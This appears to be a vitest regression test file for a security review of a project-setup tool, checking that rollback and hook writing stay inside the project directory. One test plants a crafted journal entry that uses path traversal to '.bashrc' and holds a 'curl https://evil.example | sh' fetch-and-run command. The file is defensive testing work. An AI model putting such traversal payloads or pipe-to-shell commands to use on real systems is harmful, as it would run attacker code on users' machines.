/**
 * Regression tests of the 1.0.0 security review (documentation/architecture/security-review.md).
 */
import { mkdir, mkdtemp, readdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { sha256 } from "@smarttest/shared";
import { afterEach, describe, expect, it } from "vitest";
import { applyPlan, rollback, type SetupPlan } from "./index.js";

const dirs: string[] = [];
afterEach(async () => {
  await Promise.all(dirs.splice(0).map((d) => rm(d, { recursive: true, force: true })));
});

async function project() {
  const base = await mkdtemp(join(tmpdir(), "st-init-sec-"));
  dirs.push(base);
  const root = join(base, "repo");
  const outside = join(base, "home");
  await mkdir(join(root, ".smarttest", "state"), { recursive: true });
  await mkdir(outside);
  return { root, outside, store: join(root, ".smarttest") };
}

const plan = (files: SetupPlan["files"]): SetupPlan => ({
  summary: "",
  recommendations: [],
  warnings: [],
  files,
  config: {},
});

describe("init and rollback stay inside the project (SR-03)", () => {
  it("does not restore a crafted journal entry that points outside the project", async () => {
    const { root, outside, store } = await project();
    // A known file outside the project (the default ~/.bashrc has well-known content).
    const victim = join(outside, ".bashrc");
    await writeFile(victim, "# default\n");
    const rel = "../home/.bashrc";
    await writeFile(
      join(store, "state", "init-journal.json"),
      JSON.stringify({
        version: 1,
        createdAt: "2026-01-01T00:00:00.000Z",
        entries: [
          {
            path: rel,
            action: "modify",
            before: "curl https://evil.example | sh\n",
            afterHash: sha256("# default\n"),
          },
        ],
      }),
    );
    const result = await rollback(root, store);
    expect(result.restored).toEqual([]);
    expect(result.conflicts.join()).toContain("left untouched");
    expect(await readFile(victim, "utf8")).toBe("# default\n");
  });

  it("does not write a hook through a committed .husky link", async () => {
    const { root, outside, store } = await project();
    await symlink(outside, join(root, ".husky"), process.platform === "win32" ? "junction" : "dir");
    await expect(
      applyPlan(
        root,
        store,
        plan([
          {
            path: ".husky/pre-commit",
            action: "create",
            reason: "hook",
            after: "#!/bin/sh\nnpx smarttest run --staged\n",
            risk: "medium",
            mode: 0o755,
          },
        ]),
      ),
    ).rejects.toMatchObject({ code: "ST_UNSAFE_PATH" });
    expect(await readdir(outside)).toEqual([]);
  });

  it("still applies and rolls back an ordinary plan", async () => {
    const { root, store } = await project();
    await applyPlan(
      root,
      store,
      plan([
        { path: "smarttest.config.json", action: "create", reason: "", after: "{}\n", risk: "low" },
      ]),
    );
    expect(await readFile(join(root, "smarttest.config.json"), "utf8")).toBe("{}\n");
    const result = await rollback(root, store);
    expect(result.removed).toEqual(["smarttest.config.json"]);
  });
});
